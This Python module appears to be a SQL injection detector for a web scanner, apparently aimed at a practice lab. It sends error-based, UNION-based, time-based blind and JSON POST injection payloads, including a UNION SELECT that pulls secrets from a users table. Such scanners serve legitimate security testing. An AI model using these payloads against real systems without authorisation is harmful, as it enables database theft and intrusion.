"""SQL injection detection — error-based + time-based blind."""

import json
import re
import time
import urllib.parse
from webbreach.engines import BaseEngine
from webbreach.findings import Finding, Severity


class SQLiEngine(BaseEngine):
    name = "sqli"
    description = "SQL injection detector (error-based + time-based blind)"

    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"ORA-\d{5}",
        r"PostgreSQL.*ERROR",
        r"SQLite.*error",
        r"mysql_fetch",
        r"Unclosed quotation mark",
        r"Syntax error.*sql",
        r"you have an error in your sql",
        r"unrecognized token",
        r"near \".*\": syntax error",
    ]

    def _scan(self) -> list[Finding]:
        findings: list[Finding] = []
        url = f"{self.target_url}/sqli"

        # --- Error-based GET ---
        status, body, _ = self._get(f"{url}?id=1'%20OR%201=1--")
        for pat in self.ERROR_PATTERNS:
            if re.search(pat, body, re.I):
                findings.append(self._finding(
                    severity=Severity.CRITICAL,
                    title="SQL Injection (error-based GET)",
                    param="id",
                    method="GET",
                    evidence=body[:300],
                    payload="1' OR 1=1--",
                ))
                break

        # --- Error-based GET via UNION ---
        status, body, _ = self._get(f"{url}?id=1%20UNION%20SELECT%201,name,secret%20FROM%20users--")
        if "admin" in body.lower() or "secret" in body.lower() or "F4G" in body:
            findings.append(self._finding(
                severity=Severity.CRITICAL,
                title="SQL Injection (UNION-based GET)",
                param="id",
                method="GET",
                evidence=body[:300],
                payload="1 UNION SELECT 1,name,secret FROM users--",
            ))

        # --- Time-based blind ---
        t0 = time.time()
        # Use separate request to avoid error-based detection
        self._get(f"{url}?id=1%27%20OR%201%3D1%20AND%201%3D1%20LIMIT%201%20SLEEP(1)")
        elapsed = time.time() - t0
        if elapsed >= 0.25:
            findings.append(self._finding(
                severity=Severity.HIGH,
                title="SQL Injection (time-based blind GET)",
                param="id",
                method="GET",
                evidence=f"Response delay: {elapsed:.2f}s",
                payload="1' OR 1=1 AND 1=1 LIMIT 1 SLEEP(1)",
            ))

        # --- POST injection (data leakage) ---
        status, body, _ = self._post(
            f"{self.target_url}/sqli_post",
            json.dumps({"name": "admin' OR '1'='1"}),
            content_type="application/json",
        )
        # Check for error-based
        for pat in self.ERROR_PATTERNS:
            if re.search(pat, body, re.I):
                findings.append(self._finding(
                    severity=Severity.CRITICAL,
                    title="SQL Injection (error-based POST JSON)",
                    param="name",
                    method="POST",
                    evidence=body[:300],
                    payload="admin' OR '1'='1",
                ))
                break
        else:
            # Check for data leakage (all records returned)
            if "admin" in body and "F4G" in body:
                findings.append(self._finding(
                    severity=Severity.CRITICAL,
                    title="SQL Injection (data leakage POST JSON)",
                    param="name",
                    method="POST",
                    evidence=body[:300],
                    payload="admin' OR '1'='1",
                ))

        return findings
